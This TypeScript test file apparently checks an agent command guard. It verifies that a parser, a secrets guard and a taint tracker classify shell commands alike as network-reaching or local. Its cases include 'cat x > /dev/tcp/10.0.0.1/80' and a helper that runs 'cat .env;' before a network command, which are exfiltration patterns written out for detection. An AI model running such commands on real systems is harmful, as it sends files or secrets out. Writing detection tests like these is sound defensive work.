import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import { DEFAULT_BYLAWS } from '../src/bylaws.js';
import { decide } from '../src/engine.js';
import { NETWORK_COMMANDS, reachesNetwork } from '../src/network.js';
import { parseCommand } from '../src/shell.js';
import { traitsOf } from '../src/taint/index.js';
import { EMPTY_STATE } from '../src/types.js';

const CASES: { cmd: string; network: boolean }[] = [
  { cmd: 'curl https://x.example.test', network: true },
  { cmd: 'git push origin main', network: true },
  { cmd: 'git status', network: false },
  { cmd: 'npm publish', network: true },
  { cmd: 'npm test', network: false },
  { cmd: 'gh issue create', network: true },
  { cmd: 'aws s3 cp a s3://b/a', network: true },
  { cmd: 'docker push img', network: true },
  { cmd: 'docker build .', network: false },
  { cmd: 'rsync -a build/ host:/srv/', network: true },
  { cmd: 'rsync -a build/ out/', network: false },
  { cmd: 'python3 -c "import urllib.request"', network: true },
  { cmd: 'python3 script.py', network: false },
  { cmd: 'cat x > /dev/tcp/10.0.0.1/80', network: true },
  { cmd: 'ls -la', network: false },
];

function secretsSeesNetwork(cmd: string): boolean {
  return decide({ kind: 'exec', command: `cat .env; ${cmd}`, shell: 'posix', tool: 'Bash' }, DEFAULT_BYLAWS, EMPTY_STATE).rule === 'secrets.send';
}

function taintSeesNetwork(cmd: string): boolean {
  return traitsOf({ kind: 'exec', command: cmd, shell: 'posix', tool: 'Bash' }, { projectRoot: '/work/app' }).network;
}

describe('one shared network list', () => {
  for (const c of CASES) {
    it(`${c.cmd} -> ${c.network ? 'network' : 'local'} for the parser, the secrets guard and the taint tracker`, () => {
      assert.equal(parseCommand(c.cmd).commands.some(reachesNetwork), c.network);
      assert.equal(secretsSeesNetwork(c.cmd), c.network);
      assert.equal(taintSeesNetwork(c.cmd), c.network);
    });
  }
  it('every listed command name counts as network for both users', () => {
    for (const name of NETWORK_COMMANDS) {
      assert.equal(secretsSeesNetwork(`${name} x`), true, name);
      assert.equal(taintSeesNetwork(`${name} x`), true, name);
    }
  });
});
